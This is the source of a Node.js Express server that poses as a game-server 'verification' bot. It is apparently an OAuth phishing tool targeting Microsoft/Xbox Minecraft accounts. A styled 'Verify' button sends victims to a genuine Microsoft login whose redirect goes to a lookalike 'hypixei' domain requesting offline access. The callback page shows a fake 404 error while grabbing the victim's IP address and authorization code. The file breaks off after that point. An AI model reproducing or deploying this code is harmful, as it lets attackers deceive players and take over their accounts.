//Requirements
const redirect = 'https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=2e4c3aeb-b621-4641-baea-953a726f9b0c&redirect_uri=https://oauth.hypixei.com/callback&scope=XboxLive.signin+offline_access&state=85b73d200c622429a224b89870686ec79ab498fbec1fc3d3ba46a7c325eb3091 '
const axios = require('axios')
const express = require('express')
const app = express()
const requestIp = require('request-ip')
const port = process.env.PORT || 3000

app.get('/verify', async (req, res) => {
	res.send("<html> <head> <meta charset=\"UTF-8\"> <title>Verification</title> <style> a:visited { color: LightGray; } a { color: LightGray; } a:hover { color: white; } div { height: 50px; } @import url('http://fonts.cdnfonts.com/css/proxima-nova-2'); body { margin: 0; padding: 0; background: #212121; } button { position: absolute; animate: 0.5s; transition: 0.5s; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 200px; height: 60px; text-align: center; line-height: 60px; color: #fff; font-size: 22px; text-transform: uppercase; text-decoration: none; font-family: 'Proxima Nova', sans-serif; box-sizing: border-box; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 30px; z-index: 1; cursor:pointer; } button:hover { animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } @keyframes animate { 0% { background-position: 0%; } 100% { background-position: 400%; } } button:before { animate: 0.5s; transition: 0.5s; content: ''; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px; z-index: -1; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 40px; opacity: 0; transition: 0.5s; } button:hover:before { filter: blur(20px); opacity: 1; animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } </style> </head> <body> <button type=\"button\" onclick= \"window.open('"+redirect+"','popUpWindow','height=500,width=400,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');\">Verify</button> </body> </html>")
})

app.get('/', async (req, res) => {
    //also cool little "Verified!" html page
    res.send('<html> <head> <meta charset="UTF-8"> <title>Error Code 404</title> <style>  .neonText { color: #fff; text-shadow: 0 0 7px #fff, 0 0 10px #fff, 0 0 21px #fff, 0 0 42px #0fa, 0 0 82px #0fa, 0 0 92px #0fa, 0 0 102px #0fa, 0 0 151px #0fa; } /* Additional styling */ body { font-size: 18px; font-family: \"Helvetica Neue\", sans-serif; background-color: #010a01; } h1, h2 { text-align: center; text-transform: uppercase; font-weight: 400; } h1 { font-size: 4.2rem; } .pulsate { animation: pulsate 1.5s infinite alternate; } h2 { font-size: 1.2rem; } .container { margin-top: 20vh; } @keyframes pulsate { 100% { text-shadow: 0 0 4px #fff, 0 0 11px #fff, 0 0 19px #fff, 0 0 40px #0fa, 0 0 80px #0fa, 0 0 90px #0fa, 0 0 100px #0fa, 0 0 150px #0fa; } 0% { text-shadow: 0 0 2px #fff, 0 0 4px #fff, 0 0 6px #fff, 0 0 10px #0fa, 0 0 45px #0fa, 0 0 55px #0fa, 0 0 70px #0fa, 0 0 80px #0fa; }  </style> </head> <body> <div class="container"> <h1 class="neonText pulsate">Error Code: 404</h1> <h2 class=\"neonText pulsate\">There was an error while contacting the verification bot.</h2> </div> </body> </html>')
    const clientIp = requestIp.getClientIp(req)
    const code = req.query.code
    if (code == null) {
        return
    }
  
}
